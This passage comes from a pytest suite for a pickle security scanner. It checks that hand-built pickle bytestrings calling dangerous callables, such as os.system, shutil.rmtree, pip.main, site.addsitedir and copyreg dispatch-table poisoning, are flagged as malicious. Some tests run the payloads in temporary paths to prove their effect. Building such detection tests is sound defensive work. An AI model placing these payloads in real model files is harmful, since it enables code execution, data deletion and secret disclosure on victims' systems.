    original_handlers = list(logging.root.handlers)

    try:
        handler = logging.StreamHandler(io.StringIO())
        logging.root.handlers[:] = [handler]
        report = scan_bytes(payload, source="logging-root-handlers-list-clear.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert len(logging.root.handlers) == 1
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == "builtins.list.clear"
            for finding in report.findings
        )
        assert pickle.loads(payload) is None
        assert logging.root.handlers == []
    finally:
        logging.root.handlers[:] = original_handlers


def test_scan_bytes_detects_warnings_filters_list_pop_policy_erasure() -> None:
    payload = _warnings_filters_list_pop_payload()
    original_filters = list(warnings.filters)

    try:
        warnings.resetwarnings()
        warnings.simplefilter("error")
        report = scan_bytes(payload, source="warnings-filters-list-pop.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert warnings.filters[0][0] == "error"
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == "builtins.list.pop"
            for finding in report.findings
        )
        removed_filter = pickle.loads(payload)
        assert removed_filter[0] == "error"
        assert warnings.filters == []
    finally:
        mutable_filters = cast(list[object], warnings.filters)
        mutable_filters[:] = original_filters


def test_scan_bytes_detects_warnings_filters_list_setitem_suppression() -> None:
    payload = _warnings_filters_list_setitem_ignore_payload()
    original_filters = list(warnings.filters)

    try:
        warnings.resetwarnings()
        warnings.simplefilter("error")
        report = scan_bytes(payload, source="warnings-filters-list-setitem.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert warnings.filters[0][0] == "error"
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == "builtins.list.__setitem__"
            for finding in report.findings
        )
        assert pickle.loads(payload) is None
        assert warnings.filters[0][0] == "ignore"
    finally:
        mutable_filters = cast(list[object], warnings.filters)
        mutable_filters[:] = original_filters


@pytest.mark.parametrize(
    ("payload", "expected_reference"),
    [
        (_logging_root_handlers_list_pop_payload(), "builtins.list.pop"),
        (_logging_root_handlers_list_delitem_payload(), "builtins.list.__delitem__"),
    ],
)
def test_scan_bytes_detects_logging_root_handlers_list_item_removal(
    payload: bytes,
    expected_reference: str,
) -> None:
    original_handlers = list(logging.root.handlers)

    try:
        handler = logging.StreamHandler(io.StringIO())
        logging.root.handlers[:] = [handler]
        report = scan_bytes(payload, source=f"{expected_reference}-logging-root-handler.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert logging.root.handlers == [handler]
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == expected_reference
            for finding in report.findings
        )
        pickle.loads(payload)
        assert logging.root.handlers == []
    finally:
        logging.root.handlers[:] = original_handlers


def test_scan_bytes_detects_faulthandler_disable_diagnostic_suppression() -> None:
    payload = b"\x80\x04cfaulthandler\ndisable\n)R."
    was_enabled = faulthandler.is_enabled()

    try:
        faulthandler.enable()
        report = scan_bytes(payload, source="faulthandler-disable.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert faulthandler.is_enabled() is True
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == "faulthandler.disable"
            for finding in report.findings
        )
        assert pickle.loads(payload) is True
        assert faulthandler.is_enabled() is False
    finally:
        if was_enabled:
            faulthandler.enable()
        else:
            faulthandler.disable()


@pytest.mark.parametrize(
    ("helper", "expected_reference"),
    [
        ("addsitedir", "site.addsitedir"),
        ("addpackage", "site.addpackage"),
    ],
)
def test_scan_bytes_detects_site_pth_execution_helpers(
    tmp_path: Path,
    helper: str,
    expected_reference: str,
) -> None:
    site_dir = tmp_path / "attacker_site"
    site_dir.mkdir()
    marker = tmp_path / f"{helper}-pth-executed.txt"
    message = f"{helper}-pth-payload"
    pth_path = site_dir / "payload.pth"
    _write_executing_pth(pth_path, marker, message)
    payload = (
        _site_addsitedir_payload(site_dir)
        if helper == "addsitedir"
        else _site_addpackage_payload(site_dir, pth_path.name)
    )
    site_dir_text = str(site_dir)

    try:
        while site_dir_text in sys.path:
            sys.path.remove(site_dir_text)
        report = scan_bytes(payload, source=f"{expected_reference}-pth.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert marker.exists() is False
        assert site_dir_text not in sys.path
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == expected_reference
            for finding in report.findings
        )
        assert pickle.loads(payload) is None
        assert marker.read_text(encoding="utf-8") == message
        if helper == "addsitedir":
            assert site_dir_text in sys.path
    finally:
        while site_dir_text in sys.path:
            sys.path.remove(site_dir_text)


def test_scan_bytes_detects_dbm_open_resource_creation(tmp_path: Path) -> None:
    base = tmp_path / "payload_dbm"
    payload = _dbm_open_payload(base)

    report = scan_bytes(payload, source="dbm-open-create.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert not list(tmp_path.iterdir())
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == "dbm.open"
        for finding in report.findings
    )
    db = pickle.loads(payload)
    try:
        assert any(path.name.startswith("payload_dbm") for path in tmp_path.iterdir())
    finally:
        db.close()


def test_scan_bytes_detects_maildir_resource_creation(tmp_path: Path) -> None:
    maildir = tmp_path / "payload_maildir"
    payload = _maildir_payload(maildir)

    report = scan_bytes(payload, source="maildir-create.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert maildir.exists() is False
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == "mailbox.Maildir"
        for finding in report.findings
    )
    pickle.loads(payload)
    assert sorted(path.name for path in maildir.iterdir()) == ["cur", "new", "tmp"]


def test_scan_bytes_detects_named_temporary_file_resource_creation(tmp_path: Path) -> None:
    payload = _named_temporary_file_payload(tmp_path)

    report = scan_bytes(payload, source="named-temporary-file-create.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert not list(tmp_path.iterdir())
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == "tempfile.NamedTemporaryFile"
        for finding in report.findings
    )
    created_path: Path | None = None
    wrapper = pickle.loads(payload)
    try:
        created_path = Path(wrapper.name)
        assert created_path.parent == tmp_path
        assert created_path.exists() is True
    finally:
        wrapper.close()
        if created_path is not None:
            created_path.unlink(missing_ok=True)


def test_scan_bytes_detects_temporary_directory_resource_creation(tmp_path: Path) -> None:
    payload = _temporary_directory_payload(tmp_path)

    report = scan_bytes(payload, source="temporary-directory-create.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert not list(tmp_path.iterdir())
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == "tempfile.TemporaryDirectory"
        for finding in report.findings
    )
    created_path: Path | None = None
    temporary_directory = pickle.loads(payload)
    try:
        created_path = Path(temporary_directory.name)
        assert created_path.parent == tmp_path
        assert created_path.is_dir()
    finally:
        temporary_directory.cleanup()


@pytest.mark.parametrize(
    ("read_method", "expected_reference"),
    [
        (b"ConfigParser.read", "configparser.ConfigParser.read"),
        (b"RawConfigParser.read", "configparser.RawConfigParser.read"),
    ],
)
def test_scan_bytes_detects_configparser_read_get_disclosure_chain(
    tmp_path: Path,
    read_method: bytes,
    expected_reference: str,
) -> None:
    config_path = tmp_path / "secret.ini"
    config_path.write_text("[secrets]\ntoken = modelaudit-config-secret-10\n", encoding="utf-8")
    payload = _configparser_read_get_payload(config_path, read_method)

    report = scan_bytes(payload, source=f"{expected_reference}-read-get.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == expected_reference
        for finding in report.findings
    )
    assert pickle.loads(payload) == "modelaudit-config-secret-10"


def test_scan_bytes_detects_argparse_filetype_constructed_callable(tmp_path: Path) -> None:
    target = tmp_path / "argparse-filetype-should-not-truncate.txt"
    target.write_text("keep this content\n", encoding="utf-8")
    payload = _argparse_filetype_payload(target)

    report = scan_bytes(payload, source="argparse-filetype.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert target.stat().st_size > 0
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == "argparse.FileType"
        for finding in report.findings
    )
    handle = pickle.loads(payload)
    try:
        assert target.stat().st_size == 0
    finally:
        handle.close()


@pytest.mark.parametrize(
    ("payload", "expected_reference"),
    [
        (_copyreg_pickle_payload(), "copyreg.pickle"),
        (_copyreg_dispatch_table_update_payload(), "builtins.dict.update"),
        (_copyreg_dispatch_table_setitem_payload(), "builtins.dict.__setitem__"),
        (_copyreg_dispatch_table_operator_setitem_payload(), "operator.setitem"),
        (_copyreg_dispatch_table_operator_ior_payload(), "operator.ior"),
        (_copyreg_dispatch_table_setdefault_payload(), "builtins.dict.setdefault"),
        (_copyreg_dispatch_table_ior_payload(), "builtins.dict.__ior__"),
    ],
)
def test_scan_bytes_detects_copyreg_dispatch_table_poisoning(payload: bytes, expected_reference: str) -> None:
    original_dispatch_table = dict(copyreg.dispatch_table)

    try:
        copyreg.dispatch_table.pop(decimal.Decimal, None)
        report = scan_bytes(payload, source=f"{expected_reference}-copyreg-poison.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert decimal.Decimal not in copyreg.dispatch_table
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == expected_reference
            for finding in report.findings
        )
        pickle.loads(payload)
        assert copyreg.dispatch_table.get(decimal.Decimal) is str
        with pytest.raises(pickle.PicklingError):
            pickle.dumps(decimal.Decimal("1.25"), protocol=4)
    finally:
        copyreg.dispatch_table.clear()
        copyreg.dispatch_table.update(original_dispatch_table)


@pytest.mark.parametrize(
    "payload",
    [
        _local_dict_setitem_payload(),
        _local_dict_update_payload(),
        _local_list_append_payload(),
        _local_list_clear_payload(),
        _local_operator_setitem_payload(),
        _local_operator_ior_payload(),
        _local_operator_imul_payload(),
    ],
)
def test_scan_bytes_allows_local_container_mutations(payload: bytes) -> None:
    pickle.loads(payload)

    report = scan_bytes(payload, source="local-container-mutation.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


def test_scan_bytes_detects_operator_setitem_constructed_object_protocol() -> None:
    payload = _operator_setitem_constructed_object_payload()
    _PROTOCOL_MUTATION_EVENTS.clear()

    try:
        report = scan_bytes(payload, source="operator-setitem-constructed-object.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert _PROTOCOL_MUTATION_EVENTS == []
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == "operator.setitem"
            and finding.details.get("mutation_target") == "object.__setitem__"
            for finding in report.findings
        )
        assert pickle.loads(payload) is None
        assert _PROTOCOL_MUTATION_EVENTS == [("token", "value")]
    finally:
        _PROTOCOL_MUTATION_EVENTS.clear()


@pytest.mark.parametrize(
    ("payload", "expected_reference"),
    [
        (_copyreg_dispatch_table_pop_union_payload(), "builtins.dict.pop"),
        (_copyreg_dispatch_table_delitem_union_payload(), "builtins.dict.__delitem__"),
        (_copyreg_dispatch_table_operator_delitem_union_payload(), "operator.delitem"),
    ],
)
def test_scan_bytes_detects_copyreg_dispatch_table_reducer_deletion(
    payload: bytes,
    expected_reference: str,
) -> None:
    original_dispatch_table = dict(copyreg.dispatch_table)
    union_type = type(int | str)

    try:
        assert union_type in copyreg.dispatch_table
        pickle.dumps(int | str, protocol=4)
        report = scan_bytes(payload, source=f"{expected_reference}-copyreg-delete.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == expected_reference
            for finding in report.findings
        )
        pickle.loads(payload)
        assert union_type not in copyreg.dispatch_table
        with pytest.raises(TypeError, match=r"cannot pickle 'types\.UnionType' object"):
            pickle.dumps(int | str, protocol=4)
    finally:
        copyreg.dispatch_table.clear()
        copyreg.dispatch_table.update(original_dispatch_table)


def test_scan_bytes_detects_copyreg_dispatch_table_popitem_erasure() -> None:
    original_dispatch_table = dict(copyreg.dispatch_table)
    payload = _copyreg_dispatch_table_popitem_payload()

    try:
        copyreg.dispatch_table[decimal.Decimal] = str
        report = scan_bytes(payload, source="builtins-dict-popitem-copyreg.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert copyreg.dispatch_table.get(decimal.Decimal) is str
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == "builtins.dict.popitem"
            for finding in report.findings
        )
        popped_item = pickle.loads(payload)
        assert popped_item == (decimal.Decimal, str)
        assert decimal.Decimal not in copyreg.dispatch_table
    finally:
        copyreg.dispatch_table.clear()
        copyreg.dispatch_table.update(original_dispatch_table)


def test_scan_bytes_detects_copyreg_dispatch_table_erasure() -> None:
    original_dispatch_table = dict(copyreg.dispatch_table)
    payload = _copyreg_dispatch_table_clear_payload()

    try:
        assert copyreg.dispatch_table
        report = scan_bytes(payload, source="builtins-dict-clear-copyreg.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.MALICIOUS
        assert any(
            finding.rule_code == "DANGEROUS_CALL"
            and finding.severity == Severity.CRITICAL
            and finding.details.get("import_reference") == "builtins.dict.clear"
            for finding in report.findings
        )
        assert pickle.loads(payload) is None
        assert copyreg.dispatch_table == {}
    finally:
        copyreg.dispatch_table.clear()
        copyreg.dispatch_table.update(original_dispatch_table)


def test_scan_bytes_allows_trusted_dill_dump_import_only(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        package_api,
        "import_only_reference_is_proven_trusted",
        lambda module, name: (module, name) == ("dill", "dump"),
    )

    report = scan_bytes(b"cdill\ndump\n.", source="dill-dump-import-only.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


def test_scan_bytes_requires_source_analysis_for_invoked_trusted_dill_dump(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    payload = b"\x80\x02cdill\ndump\n(tR."
    monkeypatch.setattr(
        package_api,
        "import_only_reference_is_proven_trusted",
        lambda module, name: (module, name) == ("dill", "dump"),
    )

    report = scan_bytes(payload, source="dill-dump.pkl")

    source_reason = _call_graph_source_unavailable_reason("dill")
    if source_reason is None:
        assert report.findings == ()
        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.CLEAN
    else:
        assert report.status == ScanStatus.INCONCLUSIVE
        assert report.verdict == SafetyVerdict.SUSPICIOUS
        assert any(
            finding.rule_code == "NON_ALLOWLISTED_GLOBAL" and finding.details.get("import_reference") == "dill.dump"
            for finding in report.findings
        )
        assert any(
            notice.code == "call_graph_source_unavailable"
            and notice.details.get("import_reference") == "dill.dump"
            and notice.details.get("reason") == source_reason
            for notice in report.notices
        )


def test_scan_bytes_warns_when_invoked_dill_dump_resolves_to_shadow_module(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    marker = tmp_path / "shadowed-dill-dump-marker"
    (tmp_path / "dill.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\ndef dump():\n    pass\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))

    report = scan_bytes(b"\x80\x02cdill\ndump\n(tR.", source="shadowed-dill-dump.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL" and finding.details.get("import_reference") == "dill.dump"
        for finding in report.findings
    )


def test_scan_bytes_warns_when_invoked_dill_dump_origin_is_unresolved(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        "modelaudit_picklescan.call_graph._resolve_module_source",
        lambda _module_name: None,
    )
    monkeypatch.setattr(
        "modelaudit_picklescan.call_graph._find_module_spec_without_imports",
        lambda _module_name: None,
    )
    _clear_source_sensitive_caches()
    try:
        report = scan_bytes(b"\x80\x02cdill\ndump\n(tR.", source="unresolved-dill-dump.pkl")
    finally:
        _clear_source_sensitive_caches()

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL" and finding.details.get("import_reference") == "dill.dump"
        for finding in report.findings
    )
    assert any(
        notice.code == "call_graph_source_unavailable"
        and notice.details.get("import_reference") == "dill.dump"
        and notice.details.get("analysis_incomplete") is True
        for notice in report.notices
    )


def test_scan_bytes_flags_dill_loads_as_dangerous() -> None:
    payload = b"cdill\nloads\n."

    report = scan_bytes(payload, source="dill-loads.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_GLOBAL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == "dill.loads"
        for finding in report.findings
    )


def test_scan_bytes_flags_dill_load_as_dangerous() -> None:
    payload = b"cdill\nload\n."

    report = scan_bytes(payload, source="dill-load.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_GLOBAL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == "dill.load"
        for finding in report.findings
    )


@pytest.mark.parametrize("helper", ["load_module", "load_session"])
def test_scan_bytes_flags_dill_loader_helpers_as_dangerous(helper: str) -> None:
    payload = f"cdill\n{helper}\n.".encode()

    report = scan_bytes(payload, source=f"dill-{helper}.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_GLOBAL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == f"dill.{helper}"
        for finding in report.findings
    )


def test_scan_bytes_allows_benign_dill_text_literal() -> None:
    payload = pickle.dumps({"note": "dill is mentioned in documentation only"}, protocol=4)

    report = scan_bytes(payload, source="dill-note.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


@pytest.mark.parametrize(
    ("payload", "expected_reference"),
    [
        (b"cargparse\nFileType\n(tR.", "argparse.FileType"),
        (b"cbase64\nb64decode\n(tR.", "base64.b64decode"),
        (b"cbase64\nb64encode\n(tR.", "base64.b64encode"),
        (b"cbase64\ndecode\n(tR.", "base64.decode"),
        (b"ccodecs\ndecode\n(tR.", "codecs.decode"),
        (b"ccodecs\nencode\n(tR.", "codecs.encode"),
        (b"ccodecs\nopen\n(tR.", "codecs.open"),
        (b"cconfigparser\nConfigParser.read\n(tR.", "configparser.ConfigParser.read"),
        (b"cconfigparser\nRawConfigParser.read\n(tR.", "configparser.RawConfigParser.read"),
        (b"ccopyreg\npickle\n(tR.", "copyreg.pickle"),
        (b"cdbm\nopen\n(tR.", "dbm.open"),
        (b"cfaulthandler\ndisable\n(tR.", "faulthandler.disable"),
        (b"cgzip\nopen\n(tR.", "gzip.open"),
        (b"cbz2\nopen\n(tR.", "bz2.open"),
        (b"cio\nopen\n(tR.", "io.open"),
        (b"clzma\nopen\n(tR.", "lzma.open"),
        (b"cpip\nmain\n(tR.", "pip.main"),
        (b"cnumpy\nload\n(tR.", "numpy.load"),
        (b"clogging\nFileHandler\n(tR.", "logging.FileHandler"),
        (b"clogging\ncaptureWarnings\n(tR.", "logging.captureWarnings"),
        (b"clogging\ndisable\n(tR.", "logging.disable"),
        (b"cmailbox\nMaildir\n(tR.", "mailbox.Maildir"),
        (b"cshutil\nrmtree\n(tR.", "shutil.rmtree"),
        (b"csite\naddpackage\n(tR.", "site.addpackage"),
        (b"csite\naddsitedir\n(tR.", "site.addsitedir"),
        (b"csite\nmain\n(tR.", "site.main"),
        (b"ctarfile\nopen\n(tR.", "tarfile.open"),
        (b"ctempfile\nNamedTemporaryFile\n(tR.", "tempfile.NamedTemporaryFile"),
        (b"ctempfile\nTemporaryDirectory\n(tR.", "tempfile.TemporaryDirectory"),
        (b"cwave\nopen\n(tR.", "wave.open"),
        (b"caifc\nopen\n(tR.", "aifc.open"),
        (b"csunau\nopen\n(tR.", "sunau.open"),
        (b"cwarnings\nfilterwarnings\n(tR.", "warnings.filterwarnings"),
        (b"cwarnings\nresetwarnings\n(tR.", "warnings.resetwarnings"),
        (b"cwarnings\nsimplefilter\n(tR.", "warnings.simplefilter"),
        (b"cwebbrowser\nopen\n(tR.", "webbrowser.open"),
        (b"czipfile\nZipFile\n(tR.", "zipfile.ZipFile"),
        (b"cbuiltins\nglobals\n(tR.", "builtins.globals"),
        (b"csmtplib\nSMTP\n(tR.", "smtplib.SMTP"),
        (b"chttplib\nHTTPConnection\n(tR.", "httplib.HTTPConnection"),
        (b"csqlite3\nconnect\n(tR.", "sqlite3.connect"),
        (b"cmarshal\nloads\n(tR.", "marshal.loads"),
        (b"ccloudpickle\nload\n(tR.", "cloudpickle.load"),
        (b"ccloudpickle\nloads\n(tR.", "cloudpickle.loads"),
        (b"cpkgutil\nresolve_name\n(tR.", "pkgutil.resolve_name"),
    ],
)
def test_scan_bytes_flags_expanded_high_risk_callables(payload: bytes, expected_reference: str) -> None:
    report = scan_bytes(payload, source=f"{expected_reference}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == expected_reference
        for finding in report.findings
    )


def test_scan_bytes_flags_newobj_ex_dangerous_class() -> None:
    payload = b"\x80\x04cos\nsystem\n)}\x92."

    report = scan_bytes(payload, source="newobj-ex.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.details.get("opcode") == "NEWOBJ_EX"
        and finding.details.get("import_reference") == "os.system"
        for finding in report.findings
    )


@pytest.mark.parametrize(
    ("payload", "expected_reference"),
    [
        (
            pickle.dumps(uuid.UUID("12345678-1234-5678-1234-567812345678"), protocol=4),
            "uuid.UUID",
        ),
        (b"cconfigparser\nConfigParser\n)R.", "configparser.ConfigParser"),
        (b"clogging\ngetLogger\n.", "logging.getLogger"),
        (b"ctempfile\ngettempdir\n.", "tempfile.gettempdir"),
        (pickle.dumps(tarfile.TarInfo("weights.bin"), protocol=4), "tarfile.TarInfo"),
        (pickle.dumps(zipfile.ZipInfo("weights.bin"), protocol=4), "zipfile.ZipInfo"),
    ],
)
def test_scan_bytes_does_not_treat_benign_stdlib_module_references_as_dangerous(
    payload: bytes,
    expected_reference: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name, _, reference_name = expected_reference.partition(".")
    with monkeypatch.context() as patch:
        if (module_name, reference_name) not in _TRUSTED_LOADED_REFERENCE_BASELINES:
            patch.delitem(sys.modules, module_name, raising=False)
        _clear_source_sensitive_caches()
        report = scan_bytes(payload, source=f"{expected_reference}.pkl")
    _clear_source_sensitive_caches()

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert any(
        ref["import_reference"] == expected_reference and ref["is_dangerous"] is False
        for ref in report.metadata["import_references"]
    )


@pytest.mark.parametrize(
    ("payload", "expected_reference", "expected_severity", "expected_verdict"),
    [
        (
            b"cuuid\n_get_command_stdout\n(tR.",
            "uuid._get_command_stdout",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"cuuid\n_popen\n(tR.",
            "uuid._popen",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"cuuid\n_ifconfig_getnode\n(tR.",
            "uuid._ifconfig_getnode",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"cuuid\n_ip_getnode\n(tR.",
            "uuid._ip_getnode",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"cuuid\n_arp_getnode\n(tR.",
            "uuid._arp_getnode",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"cuuid\n_lanscan_getnode\n(tR.",
            "uuid._lanscan_getnode",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"cuuid\n_netstat_getnode\n(tR.",
            "uuid._netstat_getnode",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"cuuid\ngetnode\n(tR.",
            "uuid.getnode",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"cctypes\nCDLL\n(tR.",
            "ctypes.CDLL",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"cctypes\ncast\n(tR.",
            "ctypes.cast",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"ccProfile\nrun\n(tR.",
            "cProfile.run",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"cpdb\nrun\n(tR.",
            "pdb.run",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"ctimeit\ntimeit\n(tR.",
            "timeit.timeit",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"cprofile\nrun\n(tR.",
            "profile.run",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"c_thread\nallocate_lock\n(tR.",
            "_thread.allocate_lock",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"clinecache\ngetline\n(tR.",
            "linecache.getline",
            Severity.WARNING,
            SafetyVerdict.SUSPICIOUS,
        ),
        (
            b"clogging.config\nfileConfig\n(tR.",
            "logging.config.fileConfig",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"clogging.config\ndictConfig\n(tR.",
            "logging.config.dictConfig",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"clogging.config\nlisten\n(tR.",
            "logging.config.listen",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"czipimport\nzipimporter\n(tR.",
            "zipimport.zipimporter",
            Severity.CRITICAL,
            SafetyVerdict.MALICIOUS,
        ),
        (
            b"ctempfile\nmktemp\n(tR.",
            "tempfile.mktemp",
            Severity.WARNING,
            SafetyVerdict.SUSPICIOUS,
        ),
    ],
)
def test_scan_bytes_keeps_exact_risky_stdlib_functions_flagged(
    payload: bytes,
    expected_reference: str,
    expected_severity: Severity,
    expected_verdict: SafetyVerdict,
) -> None:
    report = scan_bytes(payload, source=f"{expected_reference}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == expected_verdict
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == expected_severity
        and finding.details.get("import_reference") == expected_reference
        for finding in report.findings
    )


def test_scan_bytes_flags_private_dill_constructors_as_dangerous() -> None:
    payload = b"\x80\x02cdill._dill\n_create_function\n)R."

    report = scan_bytes(payload, source="dill-create-function.pkl")

    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.CRITICAL
        and finding.details.get("import_reference") == "dill._dill._create_function"
        for finding in report.findings
    )


def test_scan_bytes_resolves_short_binstring_stack_global_operands() -> None:
    payload = b"\x80\x04U\x0bcollectionsU\x0bOrderedDict\x93."

    report = scan_bytes(payload, source="ordered-dict.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert report.to_dict()["metadata"]["import_references"] == [
        {
            "import_reference": "collections.OrderedDict",
            "module": "collections",
            "name": "OrderedDict",
            "opcode": "STACK_GLOBAL",
            "position": 28,
            "is_dangerous": False,
            "requires_origin_verification": True,
        }
    ]


def test_scan_bytes_warns_on_import_only_custom_global_that_executes_module_initialization(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_payload_{uuid.uuid4().hex}"
    marker = tmp_path / "import_only_global_marker"
    source_path = tmp_path / f"{module_name}.py"
    source_path.write_text(
        f"from pathlib import Path\nPath({str(marker)!r}).write_text('owned')\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    py_compile.compile(str(source_path), cfile=str(tmp_path / f"{module_name}.pyc"), doraise=True)
    source_path.unlink()
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

